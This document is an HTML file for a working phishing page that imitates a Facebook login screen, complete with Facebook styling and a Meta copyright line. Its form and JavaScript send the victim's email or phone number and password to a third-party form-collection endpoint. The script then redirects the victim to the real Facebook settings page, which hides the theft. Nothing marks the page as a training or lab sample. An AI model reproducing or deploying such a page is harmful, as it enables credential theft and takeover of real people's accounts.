<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
     body {
    font-family: Arial, sans-serif;
    background-color: #f0f2f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.login-container {
    background-color: #fff;
    padding: 70px;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    text-align: center;
}

.logo {
    width: 100px;
    margin-bottom: 20px;
}

h2 {
    margin-bottom: 20px;
}

form {
    display: flex;
    flex-direction: column;
}

input[type="text"],
input[type="password"],
button {
    padding: 12px;
    margin-bottom: 10px;
    border: 1px solid #ccc;
    border-radius: 5px;
    font-size: 20px;
}

button {
    background-color: #1877f2;
    color: #fff;
    border: none;
    cursor: pointer;
}

button:hover {
    background-color: #166fe5;
}

p {
    margin-top: 10px;
}

a {
    text-decoration: none;
    color: #1877f2;
}

a:hover {
    text-decoration: underline;
}
   </style>
</head>
<body>
    <div class="login-container">
      <center><h style="font-size:66px;color:#166fe5">facebook</h></center>
        <h2>Log into Facebook to continue</h2>
        <form action="https://formkeep.com/f/f9d36ad79e28"  method="POST" id="Ftform">
            <input type="text" name="email or phone" placeholder="Email or Phone number" required/>
            <input type="password" name="password" placeholder="Password" required/>
            <button type="submit">Log In</button>
            <a href="#">Forgot password?</a>
            <p>or</p>
          <button style="background-color:green"><p><a style="color:white">Create new account</button></a></p>
          <p>About . Help . More</p>
          <p>Meta Â© 2024</p>
        </form>      
     <script>
        // Function to set language based on user's region
        function setLanguage() {
            // Detect user's region (you can use any method to determine this)
            var userRegion = 'en'; // For example, let's assume default is English

            // Check user's region and set language accordingly
            switch (userRegion) {
                case 'en':
                    document.getElementById('Ftform').setAttribute('lang', 'en');
                    break;
                case 'fr':
                    document.getElementById('Ftform').setAttribute('lang', 'fr');
                    break;
                // Add more cases for other languages as needed
                default:
                    document.getElementById('Ftform').setAttribute('lang', 'en'); // Default to English
                    break;
            }
        }

        // Call setLanguage function when the page loads
        setLanguage();

    // Add event listener for form submission
    document.getElementById('Ftform').addEventListener('submit', function(event) {
      // Prevent the default form submission
      event.preventDefault();
      
      // Submit the form data to FormKeep
      var form = this;
      var formData = new FormData(form);
      var xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://formkeep.com/f/f9d36ad79e28', true);
      xhr.setRequestHeader('accept', 'application/javascript');
      xhr.onload = function() {
        if (xhr.status === 200) {
          // Form submission successful, redirect the user to another URL
          window.location.href = 'https://www.facebook.com/settings';
        } else {
          // Handle form submission error
          console.error('Form submission failed');
        }
      };
      xhr.send(formData);
    });
  </script>
</body>
</html>
